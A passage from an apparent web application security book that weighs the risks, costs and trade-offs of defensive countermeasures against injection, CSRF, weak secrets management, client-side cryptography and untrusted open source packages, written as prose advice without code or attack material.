<h4 id="leanpub-auto-lack-of-visibility-7">Lack of Visibility</h4>

<p>With the added visibility, you will have to make decisions based on the new found information you now have. There will be no more blissful ignorance if there was before.</p>

<h5 id="leanpub-auto-insufficient-logging-and-monitoring-1">Insufficient Logging and Monitoring</h5>

<p>There will be learning and work to be done to become familiar with libraries and tooling. Code will have to be written around logging as in wrapping libraries, initialising and adding logging statements or hiding them using AOP.</p>

<p>Instrumentation will have to be placed in your code. Again another excellent candidate for AOP.</p>

<h4 id="leanpub-auto-lack-of-input-validation-filtering-and-sanitisation">Lack of Input Validation, Filtering and Sanitisation</h4>

<p>You may have to invest considerable time yourself to gain good understanding into what can go wrong, where, how and how to mitigate it happening. Be inquisitive and experiment.</p>

<p>There will be more code in your systems. More code is more code that can have faults.</p>

<p>Be very careful with sanitisation. Try first to use well tested and battle hardened libraries. Resist going out on your own to modify or create sanitisation routines. They are very easy to miss edge cases and small spots that your untrusted data may end up in that you did not anticipate, thus leaving you susceptible to attack.</p>

<h5 id="leanpub-auto-cross-site-scripting-xss">Cross-Site Scripting (XSS)</h5>

<p>Covered above.</p>

<h4 id="leanpub-auto-cross-site-request-forgery-csrf-1">Cross-Site Request Forgery (CSRF)</h4>

<p>Catering for CSRF can be a daunting task and it is difficult to cover every possible attack vector. If possible, I usually try and avoid session cookies all together and use localstorage instead, then I just need to make sure my XSS countermeasures strategy is watertight, which is a bit simpler. If you are constrained to use cookies for your session identifiers, make sure you research both risks and countermeasures thoroughly. With the material I have provided along with the additional resources, you should be in good stead.</p>

<h4 id="leanpub-auto-injection-1">Injection</h4>

<p>As with all code review, it can be costly, you need to weigh the cost of review with the cost of you and your customers being exploited, I.E. loosing the assets we have discussed.</p>

<p>Avoiding the use of external interpreters means you will have to do the interpreting yourself, or you will have to be more thorough in performing the other countermeasures.</p>

<p>Occasionally finding a parametrised API for your use case can be a challenge.</p>

<p>Going through the process of defining your semantic types can take some time and it often causes the stake holders to think about things they may have glossed over. Working through validation, filtering and sanitisation can be time consuming.</p>

<p>Making sure you embrace least privilege will probably take you some time, again, this cost needs to be weighed up.</p>

<p>Making sure that the system is not revealing unnecessary information that could aid an attacker in their understanding of your systems internals will mean some testing and probably code review will be necessary. This will take time.</p>

<h5 id="leanpub-auto-sqli">SQLi</h5>

<p>If you have a legacy system with SQLi issues, then you will need to invest the time to fix them, </p>

<h5 id="web-applications-risks-that-solution-causes-nosqli">NoSQLi</h5>

<p>One risk that I see happening here all to often, is developers not understanding the particular NoSQL data store they are using, as I have mentioned, the 225 + data stores all like to do things differently, you will need to understand their APIs, what they do well and do not do well. Read the documentation, if the documentation is poor, consider using something else, if that is out of the question, dive into the implementation and work out what you need to do from that</p>

<h5 id="leanpub-auto-command-injection">Command Injection</h5>

<p>Reviewing code, testing and making the changes costs money.</p>

<h5 id="leanpub-auto-xml-injection">XML Injection</h5>

<p>May just be time here to work out what you are currently doing wrong and what you can do better.</p>

<h5 id="leanpub-auto-xslt-injection">XSLT Injection</h5>

<p>Time to review, test and apply countermeasures.</p>

<h5 id="leanpub-auto-xpath-injection">XPath Injection</h5>

<p>Time to review, test and apply countermeasures.</p>

<h5 id="leanpub-auto-xquery-injection">XQuery Injection</h5>

<p>Time to review, test and apply countermeasures.</p>

<h5 id="leanpub-auto-ldap-injection">LDAP Injection</h5>

<p>Time to review, test and apply countermeasures.</p>

<h4 id="leanpub-auto-captcha-1">Captcha</h4>

<p>Bots may/will get smarter and start reading and thinking for themselves. It is probably worth not crossing that bridge until it arrives. This will not stop humans spamming, but neither will any other captcha, unless they also stop genuine users, which according to the studies mentioned in the countermeasures section happens very often.</p>

<p>If you decide to go with one of the captcha options, there is the risk of:</p>

<ol class="numeric">
  <li>Losing customers or potential customers</li>
  <li>Simply annoying the people that you value</li>
  <li>Creating/using a captcha that does not suite the capabilities of the legitimate users likely to interact with your web application</li>
</ol>

<h4 id="leanpub-auto-management-of-application-secrets">Management of Application Secrets</h4>

<p>Reliance on adjacent layers of defence means those layers have to actually be up to scratch. There is a possibility that they will not be.</p>

<p>Possibility of missing secrets being sent over the wire.</p>

<p>Possible reliance on obscurity with many of the strategies I have seen proposed. Just be aware that obscurity may slow an attacker down a little, but it will not stop them.</p>

<h5 id="leanpub-auto-store-configuration-in-configuration-files">Store Configuration in Configuration files</h5>

<p>With moving any secrets from source code to configuration files, there is a possibility that the secrets will not be changed at the same time. If they are not changed, then you have not really helped much, as the secrets are still in source control.</p>

<p>With good configuration tools like node-config, you are provided with plenty of options of splitting up meta-data, creating overrides, storing different parts in different places, etc. There is a risk that you do not use the potential power and flexibility to your best advantage. Learn the ins and outs of what ever system it is you are using and leverage its features to do the best at obscuring your secrets and if possible securing them.</p>

<h6 id="leanpub-auto-node-config-1">node-config</h6>

<p>is an excellent configuration package with lots of great features. There is no security provided with node-config, just some potential obscurity. Just be aware of that, and as discussed previously, make sure surrounding layers have beefed up security.</p>

<h6 id="leanpub-auto-windows-3">Windows:</h6>

<p>As is often the case with Microsoft solutions, their marketing often leads people to believe that they have secure solutions to problems when that is not the case. As discussed previously, there are plenty of ways to get around the Microsoft so called security features. As anything else in this space, they may provide some obscurity, but do not depend on them being secure.</p>

<p>Statements like the following have the potential for producing over confidence:</p>

<p>“<em>vSentry protects desktops without requiring patches or updates, defeating and automatically discarding all known and unknown malware, and eliminating the need for costly remediation.</em>”</p>

<p>Please keep your systems patched and updated.</p>

<p>“<em>With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use</em>”</p>

<p>There is a risk that people will believe this.</p>


<h6 id="leanpub-auto-linux-1">Linux:</h6>

<p>As with Microsofts “virtualisation-based security” Linux containers may slow system compromise down, but a determined attacker will find other ways to get around container isolation. Maintaining a small set of user accounts is a worthwhile practise, but that alone will not be enough to stop a highly skilled and determined attacker moving forward.<br />
Even when technical security is very good, an experienced attacker will use other mediums to gain what they want, like social engineering and physical as discussed in the People and Physical chapters of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>, or some other attack vectors listed in this book. Defence in depth is crucial in achieving good security. Concentrating on the lowest hanging fruit first and working your way up the tree.</p>

<p>Locking file permissions and ownership down is good, but that alone will not save you. </p>

<h5 id="leanpub-auto-least-privilege">Least Privilege</h5>

<p>Applying least privilege to everything can take quite a bit of work. Yes, it is probably not that hard to do, but does require a breadth of thought and time. Some of the areas discussed could be missed. Having more than one person working on the task is often effective as each person can bounce ideas off of each other and the other person is likely to notice areas that you may have missed and visa-versa.</p>

<h5 id="leanpub-auto-location-1">Location</h5>

<p>Segmentation is useful, and a common technique to helping to build resistance against attacks. It does introduce some complexity though. With complexity comes the added likely-hood of introducing a fault. </p>

<h5 id="leanpub-auto-data-store-compromise">Data-store Compromise</h5>

<p>If you follow the advice in the <a href="chap06.html#web-applications-countermeasures-data-store-compromise">countermeasures</a> section, you will be doing more than most other organisations in this area. It is not hard, but if implemented could increase complacency/over confidence. Always be on your guard. Always expect that although you have done a lot to increase your security stance, a determined and experienced attacker is going to push buttons you may have never realised you had. If they want something enough and have the resources and determination to get it, they probably will. This is where you need strategies in place to deal with post compromise. Create process (ideally partly automated) to deal with theft.</p>

<p>Also consider that once an attacker has made off with your data-store, even if it is currently infeasible to brute-force the secrets, there may be other ways around obtaining the missing pieces of information they need. Think about the paper shredders as discussed in the Physical chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a> and the associated <a href="http://archive.darpa.mil/shredderchallenge/">competitions</a>. With patience, most puzzles can be cracked. If the compromise is an opportunistic type of attack, they will most likely just give up and seek an easier target. If it is a targeted attack by determined and experienced attackers, they will probably try other attack vectors until they get what they want.</p>

<p>Do not let over confidence be your weakness. An attacker will search out the weak link. Do your best to remove weak links.</p>

<h4 id="web-applications-risks-that-solution-causes-lack-of-authentication-authorisation-and-session-management">Lack of Authentication, Authorisation and Session Management</h4>

<p>This is a complex topic with many areas that the developer must understand in order to make the best decisions. Having team members that already have strengths in these areas can help a lot. The technologies are moving fast, but many of the concepts encountered are similar across the technology generations. It helps to have a healthy fear, some experience of what can go wrong, and an understanding of just how many concepts must be understood in order to piece together a solution that is going to work well and resist the attacks of your enemies.</p>

<p>The flows, what they are, how they work and in which situations you should use any one of them, can easily be misunderstood.</p>

<p>When navigating the edge-cases and deciding on specific paths, the developer can often end up at a dead-end and must back-track/re-architect their approach.</p>

<p>There are risks that you may misinterpret any of the specifications, such as OAuth and OpenID, as these are complicated and fraught with concepts that can be easily misunderstood.</p>

<p>In regards to securing sessions, you have some options. If you are constrained by business requirements that insist that you use cookies, then your attack vectors are more dispersed (XSS and CSRF). If you are not constrained to use cookies, and decide to use LocalStorage for all storage of client-side session artefacts, then you can reduce your scope of focus to just XSS, but your XSS defence strategy is going to need to be water tight.</p>

<h4 id="web-applications-risks-that-solution-causes-cryptography-on-the-client">Cryptography on the Client (AKA Untrusted Crypto)</h4>

<p>The Web Cryptography API specification provides <a href="https://dvcs.w3.org/hg/webcrypto-api/raw-file/tip/spec/Overview.html#algorithm-recommendations-implementers">algorithm recommendations</a>, that are not necessarily optimal, such as the most commonly used 30 year old AES-<strong>CBC</strong> mode of operation that has known vulnerabilities, and caveats that you must know about in order to use securely, such as:</p>

<ul>
  <li>The message must be padded to a multiple of the cipher block size</li>
  <li>Encryption is sequential, it cannot be parallelized, because each block of plaintext must be XORed with the previous block of ciphertext before being encrypted. Because of this, each block of ciphertext depends on all previously processed blocks of plaintext up to that point</li>
  <li>An initialisation vector (IV) must be used in the first block in order to create each message as unique</li>
  <li>Requiring that the final block be padded before encryption</li>
  <li>“<em>Decrypting with the incorrect IV causes the first block of plaintext to be corrupt but subsequent plaintext blocks will be correct</em>”</li>
  <li>“<em>a one-bit change to the ciphertext causes complete corruption of the corresponding block of plaintext, and inverts the corresponding bit in the following block of plaintext, but the rest of the blocks remain intact. This peculiarity is exploited in different padding oracle attacks, such as POODLE.</em>”</li>
</ul>

<blockquote>
  <p>Some of the above content was used from <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation</a><br />
Licensed under <a href="https://en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License">CC by 3.0</a></p>
</blockquote>

<p>There is no normative guidance in the specification as to which primitives have better qualities than others. For example the symmetric block cipher AES-GCM is good, but all of the other symmetric block ciphers listed are not <a href="https://en.wikipedia.org/wiki/Authenticated_encryption">authenticated encryption modes</a>. Thus they don’t provide assurance that the data has not been modified. With a specification that is lacking normative advice to browser vendors, it’s likely that the Web Crypto API will fail to serve the purpose it was created for, or at best provide the right primitives, but provide the dangerous ones also, and by looking at where chrome and firefox is heading, that looks to be the case.</p>

<p>The following table shows the Web Crypto API supported algorithms for Chromium (as of version 46) and Mozilla (as of July 2016).</p>


<img src="images/WebCryptoAPIBrowserSupport.png" alt="Web Crypto API Browser Support"/>


<p>At least both are offering AES-GCM, but now you have to make the decision, and to much choice can bring confusion. The only way for us web developers to know which choices to make, is spend the time researching what to use where and asking your self the questions, why? Question everything.</p>

<p>As usual, the <a href="https://www.owasp.org/index.php/Cryptographic_Storage_Cheat_Sheet#Rule_-_Use_strong_approved_Authenticated_Encryption">OWASP guidance</a> (Cryptographic Storage Cheat Sheet) is excellent.</p>

<p>There are many stack-overflow questions and answers where many think they have the answers but really don’t and even accepted answers are completely incorrect and miss leading. Learn who the experts are, find out what they have to say and test their answers against what other experts have to say and for your self. All the information is available, you do have to take the time to absorb it though. There are few short-cuts that will put you in a good place for working out the optimal solution for your project.</p>

<h4 id="leanpub-auto-consuming-free-and-open-source">Consuming Free and Open Source</h4>

<p>Adding process and tooling as discussed is a really good start, but it’s not a complete solution alone to take care of the consumption of free and open source packages.<br />
Some of the packages we consume may have good test coverage, be up to date, and have no known vulnerabilities. Are the tests testing the right things though? Are the tests testing that something bad can “not” happen, as we discussed in the creation of “Evil Test Conditions” in the “Agile Development and Practices” section of the “Process and Practises” chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>? This is where we really need something extra on top of a good process, static analysis and dependency checking tools. This is really where you need to leverage the likes of security regression testing, as I discussed in the “Agile Development and Practices” section of the “Process and Practises” chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<h5 id="leanpub-auto-process-1">Process</h5>

<p>There is a danger of implementing to much manual process thus slowing development down more than necessary. The way the process is implemented will have a lot to do with its level of success. For example automating as much as possible, so developers don’t have to think about as much as possible is going to make for more productive, focused and <a href="https://en.wikipedia.org/wiki/Kaizen">happier</a> developers.</p>

<p>For example, when a Development Team needs to pull a library into their project, which often happens in the middle of working on a product backlog item, not necessarily planned at the beginning of the Sprint. If they have to context switch while a legal review and/or manual code review takes place, then this will cause friction and reduce the teams performance even though it may be out of their hands.<br />
In this case, the Development Team really needs a dedicated resource to perform the legal review. The manual review could be done by another team member or even themselves with perhaps another team member having a quicker review after the fact. These sorts of decisions need to be made by the Development Team, not mandated by someone outside of the team that doesn’t have skin in the game or does not have the localised understanding that the people working on the project do.</p>

<p>Maintaining a list of the approved libraries really needs to be a process that does not take a lot of human interaction. How ever you work out your process, make sure it does not require a lot of extra developer effort on an ongoing basis. Some effort up front to automate as much as possible will facilitate this.</p>

<h5 id="leanpub-auto-tooling">Tooling</h5>

<p>Relying on tooling alone is not enough.</p>

<p>Using the likes of pre-commit hooks with the CLIs and the other tooling options detailed in the <a href="chap06.html#web-applications-countermeasures-consuming-free-and-open-source-tooling">Countermeasures</a> section integrated with CI builds, and creating scripts to do most of the work for us, is going to be a good option to start with. Adding the automation of security regression testing on top of that, and your solution for managing potential vulnerabilities in free and open source packages is starting to look pretty solid.</p>

<h4 id="leanpub-auto-insufficient-attack-protection-1">Insufficient Attack Protection</h4>

<p>Applying WAFs can act as a band-aid, masking the underlying issues with the application code. Ideally your security issues want to fail fast in development. If you are running the types of tests and doing the types of activities I discussed in Fascicle 0 in the Process and Practises chapter, you should have a fairly good handle on your defects. Most WAFs I have seen are pretty old-school, in that they do not actively attack the attackers.</p>

<p>Moving toward an active automated prevention standpoint where you have code that intentionally attracts and responds to attackers is usually far more effective at dealing with malicious actors.</p>

<h3 id="web-applications-costs-and-trade-offs">5. SSM Costs and Trade-offs</h3>

<p>All security has a cost. Your resources are limited, spend them wisely.</p>

<h4 id="leanpub-auto-lack-of-visibility-8">Lack of Visibility</h4>

<h5 id="leanpub-auto-insufficient-logging-and-monitoring-2">Insufficient Logging and Monitoring</h5>

<p>You can do a lot for little cost here. I would rather trade off a few days work in order to have really good logging and instrumentation systems through your code base that is going to show you errors fast in development and pretty much anything you want to measure. Then show the types of errors and statistics devops need to see in production.</p>

<p>Same goes for dark cockpit type monitoring. Find a tool that you find working with a pleasure. There are just about always free and open source tools to every commercial alternative. If you are working with a start-up or young business, the free and open source tools can be excellent to keep ongoing costs down. Especially mature tools that are also well maintained like the ones I’ve mentioned in the <a href="chap06.html#web-applications-countermeasures-lack-of-visibility">Countermeasures</a> section.</p>

<h4 id="leanpub-auto-lack-of-input-validation-filtering-and-sanitisation-1">Lack of Input Validation, Filtering and Sanitisation</h4>

<p>If you can tighten up your validation and filtering, then less work will be required around sanitisation and that is where most of the effort (effort ≈ time) seems to go. This often reduces the end user experience though.</p>

<p>Once you fully understand the dangers you’ll be able to make these decisions easier.</p>

<h5 id="leanpub-auto-cross-site-scripting-xss-1">Cross-Site Scripting (XSS)</h5>

<p>Covered above.</p>

<h4 id="leanpub-auto-cross-site-request-forgery-csrf-2">Cross-Site Request Forgery (CSRF)</h4>

<p>As mentioned in the “Risks that Solution Causes”, I will generally favour storing session identifiers in localstorage and concentrating on Input Validation, Filtering and Sanitisation.</p>

<h4 id="leanpub-auto-injection-2">Injection</h4>

<p>You have a responsibility to your organisation and your customers to keep them safe. When you have weighed the costs of reviewing your code and if it is honestly more expensive than the cost of you and your customers being exploited, I.E. loosing your assets, then and only then, should you neglect this.</p>

<p>Writing interpreters will more than likely be very costly, and in most cases this will not be necessary. Find one that takes the risks discussed seriously and provides the correct countermeasures as discussed, or make sure you take care of the validation, filtering and sanitisation properly yourself.</p>

<p>If you can not find a parametrised API for your use case, you will need to consider doing this your self, as in wrapping what ever the best is that is available and providing your own parametrisation.</p>

<p>Creating semantic types forces you and your stake holders to think about your business requirements, anything that makes us think about these are usually helpful in making sure we are building the right thing. There is not really any alternatives to actually thinking the semantic types, validation, filtering and sanitisation through and making sure you are doing it properly, this is crucial to catching malicious sequences of untrusted data. The only other alternative is to just not process untrusted data.</p>

<p>Making sure your accounts and everything that can execute untrusted data have only the privileges assigned to them to do what they must do and no more.</p>

<p>If you do try and cut costs here, then you are providing the information that your attacker requires to understand how your systems internals are structured. If you reveal the systems weaknesses, they will be exploited.</p>

<h5 id="leanpub-auto-sqli-1">SQLi</h5>

<p>The only possible short-cut here is to not deal with untrusted data.</p>

<h5 id="web-applications-costs-and-trade-offs-nosqli">NoSQLi</h5>

<p>Similar to SQLi</p>

<h5 id="leanpub-auto-command-injection-1">Command Injection</h5>

<p>Exactly how much it will cost you will depend on how poorly the code is written, and how much has to be refactored.</p>

<h5 id="leanpub-auto-xml-injection-1">XML Injection</h5>

<p>If you have had a look at how easily some of these defects are exploitable, then you may realise that the costs to remedy are small in comparison to loosing your assets.</p>

<h5 id="leanpub-auto-xslt-injection-1">XSLT Injection</h5>

<p>Similar costs to that of Command Injection, just different technology.</p>

<h5 id="leanpub-auto-xpath-injection-1">XPath Injection</h5>

<p>Similar costs to that of what we have already covered, just different technology.</p>

<h5 id="leanpub-auto-xquery-injection-1">XQuery Injection</h5>

<p>Similar costs to that of what we have already covered, just different technology.</p>

<h5 id="leanpub-auto-ldap-injection-1">LDAP Injection</h5>

<p>Similar costs to that of what we have already covered, just different technology.</p>

<h4 id="leanpub-auto-captcha-2">Captcha</h4>

<p>The proposed solution costs very little time to implement, is simple, has no external dependencies, is not circumvented if JavaScript is disabled, in fact is not dependant on the browser or what is in it at all. Humans are not disadvantaged.</p>

<p>It does mean that any spam submitted by a real human will have to be moderated by a real human, although this usually takes less time than the human submitting the spam. For me, this is a trade-off worth taking to provide an optimal user experience for my customers/clients.</p>

<h4 id="leanpub-auto-management-of-application-secrets-1">Management of Application Secrets</h4>

<p>There is potential for hidden costs here, as adjacent layers will need to be hardened. There could be trade-offs here that force us to focus on the adjacent layers. This is never a bad thing though. It helps us to step back and take a holistic view of our security.</p>

<h5 id="leanpub-auto-store-configuration-in-configuration-files-1">Store Configuration in Configuration files</h5>

<p>There should be little cost in moving secrets out of source code and into configuration files.</p>

<h6 id="leanpub-auto-windows-4">Windows:</h6>

<p>You will need to weigh up whether the effort to obfuscate secrets is worth it or not. It can also make the developers job more cumbersome. Some of the options provided may be worthwhile doing.</p>

<h6 id="leanpub-auto-linux-2">Linux</h6>

<p>Containers have many other advantages and you may already be using them for making your deployment processes easier and less likely to have dependency issues. They also help with scaling and load balancing, so they have multiple benefits.</p>

<h5 id="leanpub-auto-least-privilege-1">Least Privilege</h5>

<p>Is something you should be at least considering and probably doing in every case. It is one of those considerations that is worth while applying to most layers.</p>

<h5 id="leanpub-auto-location-2">Location</h5>

<p>Segmenting of resources is a common and effective measure to take for at least slowing down attacks and a cost well worth considering if you have not already.</p>

<h5 id="leanpub-auto-data-store-compromise-1">Data-store Compromise</h5>

<p>The countermeasures discussed here go without saying, although many organisations do not do them well if at all. It is up to you whether you want to be one of the statistics that has all of their secrets revealed. Following the countermeasures here is something that just needs to be done if you have any data that is sensitive in your data-store(s). </p>

<h4 id="leanpub-auto-lack-of-authentication-authorisation-and-session-management">Lack of Authentication, Authorisation and Session Management</h4>

<p>The cost of performing enough research and creating Proof of Concepts (PoC) is significant, even more so when your project is micro-service based, as you will have multiple technology environments that cross cutting concerns such as authentication, authorisation and session management affect (server side, client side, mobile, IoT, etc). I’ve found that if your project has the luxury of being green-fields, then reducing the technologies used to the lowest common denominator can reduce a lot of effort. What I mean by this, is that if you can use the same technologies in all environments, or as many as possible, this will reduce the amount of Research and Development (R&amp;D) that the team will need to do in order to prove a working solution. The lowest common denominator in terms of technology stacks that work in all environments is JavaScript. In case you hadn’t noticed, JavaScript is creeping into all environments because of this very reason. Embrace it, and you’ll likely save a lot of money.</p>

<p>I’ve heard many times “but we just can’t find enough people with solid JavaScript skills and experience”. Now it doesn’t matter what the specific speciality is, I’ve personally struggled with this type of comment. If you think back to the Countermeasures section of the People chapter of Fascicle 0, specifically “Morale, Productivity and Engagement Killers” onwards, there is quite a bit of information around how to treat people with the respect they deserve. Exceptionally talented technical workers have paid a high price to become what and who they are. If you learn to always respect them and build strong meaningful relationships with these highly talented people, when you need the talent, it’ll be easy to find, they’ll be your friends. This has been my experience anyway. You can find these individuals always attending (if not leading) after work tech meetups, tech conferences and other events. They will also often be the last to leave the office each day, as they struggle to tear themselves away from their work due to a high level of engagement. They are always pushing their own technical limits and increasing their knowledge and experience. They are not hard to find if you follow this advice.</p>

<p>If you still struggle, reach out to me, and I’ll do my best to help.</p>

<h4 id="web-applications-costs-and-trade-offs-cryptography-on-the-client">Cryptography on the Client (AKA Untrusted Crypto)</h4>

<p>I’ve covered many technologies in this chapter and also in others, such as in the Network chapter under Countermeasures:</p>

<ul>
  <li>“Wrongfully Trusting the Loading of Untrusted Web Resources”<br />
For example doing everything we can to validate that what we’re downloading is in-fact what we think it is:
    <ul>
      <li>Content Security Policy (CSP)</li>
      <li>Sub-resource Integrity (SRI), allowing us to cryptographically guarantee that the resources we are downloading have not been tampered with. There is no point in consuming what we think is the crypto library we designated if what we are actually consuming is an attackers side-channel attack</li>
    </ul>
  </li>
  <li>“TLS Downgrade”</li>
</ul>

<p>That if adopted and practised properly, along with selecting the right low level primitives for the Web Crypto API, can help us achieve a level of security that will work for us (the web application developers/owners). Of course this puts our best interests at the forefront, but not necessarily the end users. As developers creating solutions for our users, We have a responsibility to put our users concerns first. </p>

<h4 id="leanpub-auto-consuming-free-and-open-source-1">Consuming Free and Open Source</h4>

<p>The process has to be streamlined so that it does not get in the developers way. A good way to do this is to ask the developers how it should be done. They know what will get in their way. In order for the process to be a success, the person(s) mandating it will need to get solid buy-in from the people using it (the developers).</p>

<p>The idea of setting up a process that notifies at least the Development Team if a library they want to use has known security defects, needs to be pitched to all stakeholders (developers, product owner, even external stakeholders) the right way. It needs to provide obvious benefit and not make anyones life harder than it already is. Everyone has their own agendas. Rather than fighting against them, include consideration for them in your pitch. I think this sort of a pitch is actually reasonably easy if you keep these factors in mind.</p>

<h4 id="leanpub-auto-insufficient-attack-protection-2">Insufficient Attack Protection</h4>

<p>It will cost you some time to create these type of active defence modules. If you are lucky, by the time you read this, I may already have some. It is on my current todo list.</p>

  <div class="next-chapter">
     Next: <a href="chap07.html">Additional Resources</a>
  </div>

</div>
</body>
</html>
